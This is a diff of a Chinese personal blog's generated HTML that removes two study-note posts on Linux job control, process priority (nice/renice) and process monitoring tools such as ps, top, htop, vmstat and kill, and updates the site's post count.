-          <h1 id="Linux系统作业控制："><a href="#Linux系统作业控制：" class="headerlink" title="Linux系统作业控制："></a>Linux系统作业控制：</h1><h2 id="Job："><a href="#Job：" class="headerlink" title="Job："></a>Job：</h2><pre><code>前台作业（foregroud）：通过终端启动，且启动后会一直占据终端；
-后台作业（background）：可以通过终端启动，但启动后即转入后台运行（释放终端）；
-
-命令行中启动的命令，如果不支持运行在后台的话，会一直占据前台；</code></pre><h3 id="如何让作业运行于后台"><a href="#如何让作业运行于后台" class="headerlink" title="如何让作业运行于后台"></a>如何让作业运行于后台</h3><pre><code>* 运行中的作业
-  * Ctrl+Z
-  * 注意：送往后台后，作业转为静止态；
-* 尚未启动的作业
-  * COMMAAD &amp;
-注意：此类作业虽然被送往后台，单其依然与终端相关；如果希望把送网后台的作业剥离与终端的关系：
-    nohup command &amp;</code></pre><h3 id="可实现作业控制的常用命令"><a href="#可实现作业控制的常用命令" class="headerlink" title="可实现作业控制的常用命令"></a>可实现作业控制的常用命令</h3><p>fg  把指定作业调回前台；注意，直接加上jobs显示的id即可，后面的+号表示默认fg转入的作业，即优先级；<br>bg  让送往后台的作业在后台继续运行；<br>kill    终止指定的作业；注意一定要加“%”号；</p>
-<h2 id="调整进程优先级"><a href="#调整进程优先级" class="headerlink" title="调整进程优先级"></a>调整进程优先级</h2><p>可通过nice值调整的优先级范围：100–139<br>    分别对应于：-20 19<br>进程启动时，其nice值默认为0，其优先级是120；</p>
-<h3 id="nice命令"><a href="#nice命令" class="headerlink" title="nice命令:"></a>nice命令:</h3><p>以指定的nice值启动并运行命令<br>nice [option] [command [ARGU]…]<br>nice -n NICE<br>注意：仅管理员可以调低nice值；</p>
-<h3 id="renice命令："><a href="#renice命令：" class="headerlink" title="renice命令："></a>renice命令：</h3><pre><code>renice [-n] NICE PID...</code></pre><p>查看NICE值和优先级：<br>    ps axo pid,ni,priority,comm</p>
-<h3 id="未涉及的命令："><a href="#未涉及的命令：" class="headerlink" title="未涉及的命令："></a>未涉及的命令：</h3><p>sar、tsar、iostat、lftop、nethog…</p>
-<h3 id="htop、dstat、top、ps命令的使用重点掌握；"><a href="#htop、dstat、top、ps命令的使用重点掌握；" class="headerlink" title="htop、dstat、top、ps命令的使用重点掌握；"></a>htop、dstat、top、ps命令的使用重点掌握；</h3>
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/06/15/15-Linux%E8%BF%9B%E7%A8%8B%E7%AE%A1%E7%90%86%E5%91%BD%E4%BB%A4/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="lcxiao">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Lcxiao's blog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2020/06/15/15-Linux%E8%BF%9B%E7%A8%8B%E7%AE%A1%E7%90%86%E5%91%BD%E4%BB%A4/" class="post-title-link" itemprop="url">15.Linux进程管理命令</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-              
-
-              <time title="创建时间：2020-06-15 13:09:04 / 修改时间：21:09:20" itemprop="dateCreated datePublished" datetime="2020-06-15T13:09:04+08:00">2020-06-15</time>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h2 id="系统调用"><a href="#系统调用" class="headerlink" title="系统调用"></a>系统调用</h2><p>read（），open（），write（）；</p>
-<p>程序开发成内部多个执行流，每个执行流可单独运行与一个cpu核心上<br>多线程运行编程模型；<br>并行计算；<br>必须拥有多核心才可以；</p>
-<p>每个进程分配固定的线程，每个线程实现一个连接；<br>linux线程即进程；</p>
-<h2 id="随时鉴定服务器的各种状态；"><a href="#随时鉴定服务器的各种状态；" class="headerlink" title="随时鉴定服务器的各种状态；"></a>随时鉴定服务器的各种状态；</h2><p>cpu、内存、进程<br>垃圾回收策略，<br>运维基本能力；</p>
-<p>管理进程的运行数量，占用资源，优先级如何；</p>
-<h2 id="进程管理命令"><a href="#进程管理命令" class="headerlink" title="进程管理命令"></a>进程管理命令</h2><p>客户访问慢。全方位去诊断，查看，网络，磁盘，程序bug；（了解程序运行法则）不背锅；</p>
-<p>Linux系统上的进程查看及管理工具：<br>pstree、ps、pidof、pgrep、top、htop、glances、pmap、vmstat、dstat、kill、pkill、job、bg、fg、nohup、nice、renice、killall…</p>
-<p>CentOS5：SYSV init；<br>CentOS6：UPstart（并行启动）dbus通信<br>CentOS7：Systemd：（红帽的程序员参考MacOS开发）（开关机都非常快）</p>
-<h2 id="pstree：查看进程树；"><a href="#pstree：查看进程树；" class="headerlink" title="pstree：查看进程树；"></a>pstree：查看进程树；</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">init-+-getty</span><br><span class="line">     |-getty</span><br><span class="line">     |-getty</span><br><span class="line">     `-getty</span><br></pre></td></tr></table></figure>
-<p>Systemd:</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">systemd─┬─VGAuthService</span><br><span class="line">        ├─atd</span><br><span class="line">        ├─auditd───&#123;auditd&#125;</span><br><span class="line">        ├─crond</span><br><span class="line">        ├─dbus-daemon───&#123;dbus-daemon&#125;</span><br><span class="line">        ├─login───bash</span><br><span class="line">        ├─lvmetad</span><br><span class="line">        ├─master─┬─pickup</span><br><span class="line">        │        └─qmgr</span><br><span class="line">        ├─mysqld_safe───mysqld───18*[&#123;mysqld&#125;]</span><br><span class="line">        ├─polkitd───6*[&#123;polkitd&#125;]</span><br><span class="line">        ├─rsyslogd───2*[&#123;rsyslogd&#125;]</span><br><span class="line">        ├─sshd───sshd───bash───pstree</span><br><span class="line">        ├─systemd-journal</span><br><span class="line">        ├─systemd-logind</span><br><span class="line">        ├─systemd-udevd</span><br><span class="line">        ├─tuned───4*[&#123;tuned&#125;]</span><br><span class="line">        └─vmtoolsd───&#123;vmtoolsd&#125;</span><br></pre></td></tr></table></figure>
-
-<h2 id="PS："><a href="#PS：" class="headerlink" title="PS："></a>PS：</h2><p>/proc   内核中的状态信息：<br>    内核参数：<br>        可设置其值从而调整内核运行特性的参数:/proc/sys<br>        状态变量：其用于输出内核中统计信息和状态信息，仅用于查看；</p>
-<pre><code>参数，模拟成文件系统类型；
-proc中数字目录为进程号：
-进程：
-    /proc/#
-        #:PID</code></pre><h2 id="ps：-report-a-snapshot-of-the-current-processes"><a href="#ps：-report-a-snapshot-of-the-current-processes" class="headerlink" title="ps： report a snapshot of the current processes."></a>ps： report a snapshot of the current processes.</h2><p>取当前命令执行这一刻的状态；<br>三种风格：</p>
-<p>1   UNIX options, which may be grouped and must be preceded by a dash.<br>2   BSD options, which may be grouped and must not be used with a dash.<br>3   GNU long options, which are preceded by two dashes.</p>
-<p>1:带一个“-“<br>2:带两个“-”<br>3：长选项“–”</p>
-<p>启动进程的方式：<br>    系统启动过程中自动启动；与终端无关的进程；<br>    用户通过终端启动：与终端相关的进程；</p>
-<pre><code>a：所有与终端相关的进程
-x：所有与终端无关的进程
-    []内核线程
-u：以用户为中心组织进程状态信息显示；
-    VSZ ：虚拟内存级，占用的虚拟内存大小（非swap）；
-    RSS ：常驻内存级；（不能放交换分区的数据）；
-    STAT ：当前进程的运行状态：BSD风格；R:running S:interruptable sleeping D :uninter... T :stopped Z:zombie
-    带+ 号表示前台进程，
-    l ：多线程进程
-    N ：高优先级
-    &lt; ：高优先级
-    s ：session leader
--e ：Unix风格：显示所有进程；
--f ：full format 完整格式的
-常用组合2： ps -ef
-
--F ：显示完整格式的进程信息
-    C：cpu utilization CPU占用
-    PSR：运行于哪颗cpu上；
--H ：以层级结构显示进程的相关信息；
-
-常用组合之三：-eFH
-常用组合之四：
--eo : 自定义要显示的字段；以逗号分割了；
-axo ：field1，field2.。。常见的field，pid、nl、prl、psr、pcpu、stat、comm、tty、ppid；
-    nl：nice值
-    priority：优先级；
-    rtprio：实时优先级；</code></pre><h2 id="pgrep、pkill命令："><a href="#pgrep、pkill命令：" class="headerlink" title="pgrep、pkill命令："></a>pgrep、pkill命令：</h2><p>进程过滤    关闭进程<br>pgrep<br>-u ：uid user；<br>-U ：UID read user；<br>-t terminal ：与指定的终端相关的进程；<br>-l ：显示进程名；<br>-a ：显示完整格式的进程名；<br>-p pid ：显示此进程的子进程；</p>
-<h2 id="pidof命令"><a href="#pidof命令" class="headerlink" title="pidof命令"></a>pidof命令</h2><p>根据进程名，取其pid</p>
-<h2 id="top命令："><a href="#top命令：" class="headerlink" title="top命令："></a>top命令：</h2><p>uptime命令：显示系统时间、运行时长以及平均负载<br>top第一行显示的就是此信息；</p>
-<p>PID 用户    优先级  nice值  虚拟内存级  常驻内存级  共享内存级  运行状态    CPU百分比   内存百分比  运行时长</p>
-<p>排序<br>P   :以占据cpu百分比排序<br>M   ：以占据内存百分比<br>T   ：累计占用cpu时间排序</p>
-<p>首部信息：<br>    uptime信息：l命令<br>    task及cpu信息：t命令<br>    内存信息：m命令</p>
-<p>退出：q<br>修改刷新：s<br>终止指定的进程：k</p>
-<p>选项：<br>-d #：刷新时间间隔，默认3s<br>-b ：批次方式显示；<br>-n #：显示多少批次；</p>
-<h2 id="HTOP"><a href="#HTOP" class="headerlink" title="HTOP"></a>HTOP</h2><pre><code>-d # ：指定延迟时间间隔；
--u USer Name ：仅显示指定用户的进程
--s colume：以指定字段进行排序</code></pre><p>子命令：<br>    l：显示进程所打开的所有文件；<br>    s：跟踪选定的进程的系统调用<br>    t：以层级关系显示各进程状态<br>    a：将选定的进程绑定至某个cpu核心上；</p>
-<h2 id="vmstat：报告虚拟内存的使用情况："><a href="#vmstat：报告虚拟内存的使用情况：" class="headerlink" title="vmstat：报告虚拟内存的使用情况："></a>vmstat：报告虚拟内存的使用情况：</h2><p>procs：<br>    r:等待运行的进程的个数；cpu上等待运行的任务的队列长度；<br>    b：处于不可中断睡眠态的进程个数；被阻塞的任务队列的长度；<br>memory：<br>    swpd ：交换内存使用总量；<br>    free ：空闲的物理内存总量<br>    buff ：用于buffee的内存总量<br>    cache :用于cache的内存总量<br>swap：<br>    si : 数据进入swap的速率：单位是（kb/s）<br>    so ：数据离开swap的速率，（kb/s）<br>io：<br>    bi ：从块设备读入数据到系统的速率（kb/s）<br>    bo ：保存数据到块设备的速率（kb/s）<br>system：<br>    in ：中断速率<br>    cs ：上下文切换的速率</p>
-<p>cpu ：<br>    us ：用户空间的程序所占用cpu的百分比<br>    sy ：system<br>    id ：idle<br>    wa ：wait<br>    st ：被虚拟化技术偷走的</p>
-<p>选项：<br>    -s ：显示内存统计信息；</p>
-<h2 id="pmap"><a href="#pmap" class="headerlink" title="pmap"></a>pmap</h2><p>pmap [options] pid […]</p>
-<p>pmap -x 1<br>    -x :显示详细格式的信息；<br>    另一种查看的方式<br>    cat /proc/PID/maps</p>
-<h2 id="glances-命令："><a href="#glances-命令：" class="headerlink" title="glances 命令："></a>glances 命令：</h2><p>常见选项：<br>    -b ：以Byte为单位显示网卡数据速率；<br>    -d ：关闭磁盘I/O模块<br>    -m ：关闭mount模块<br>    -n ：关闭network模块<br>    -t # ：刷新时间间隔<br>    -1 ：每个cpu的相关数据单独显示；<br>    -o ：指定输出格式；</p>
-<h2 id="Dstat"><a href="#Dstat" class="headerlink" title="Dstat:"></a>Dstat:</h2><p>强大的实时系统信息显示：<br>    -c –cpu        CPU相关<br>        -C total<br>    -d –disk       磁盘相关<br>        -D sda sdb total<br>    -g 显示page相关的统计数据<br>    -m 内存相关<br>    -n 网络<br>    -p 进程相关统计<br>    -r IO<br>    -s swap<br>    –tcp 显示tcp<br>    –udp<br>    –raw<br>    –socket</p>
-<pre><code>--ipc   进程间通信
-
---top-cpu 最占用cpu的进程
---top-io 
---top-memory
---top-lantency 延迟最大的进程</code></pre><h2 id="kill-命令：-terminate-a-process"><a href="#kill-命令：-terminate-a-process" class="headerlink" title="kill 命令： terminate a process"></a>kill 命令： terminate a process</h2><p>用于向进程发送信号，以实现对进程的管理；</p>
-<p>kill -l 显示系统当前的信号列表<br>每个信号的标识方法有三种：<br>    * 信号的数字标识    1<br>    * 信号的完整名称    SIGHUP<br>    * 信号的简写名称    HUP</p>
-<p>向进程发信号：<br>    kill [-s |signal|-SIGNAL] PID…</p>
-<pre><code>常用信号：
-* 1号进程：SIGHUP ：无需关闭进程让其重读配置文件；
-* 2号进程：SIGINT ：中止正在运行的进程，相当于ctrl+C
-* 9号进程：SIGKILL ：杀死运行中的进程；不管是否打开文件。直接杀掉；可能会损坏该进程打开的文件
-* 15号进程：SIGTERM：终止运行中的进程；
-* 18 ：SIGCONT 
-* 19 ：SIGSTOP </code></pre><h2 id="killall-命令："><a href="#killall-命令：" class="headerlink" title="killall 命令："></a>killall 命令：</h2><p>kill process by NAME<br><code>killall httpd</code></p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
@@ -1247,7 +1153,7 @@ axo ：field1，field2.。。常见的field，pid、nl、prl、psr、pcpu、stat
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">31</span>
+          <span class="site-state-item-count">37</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
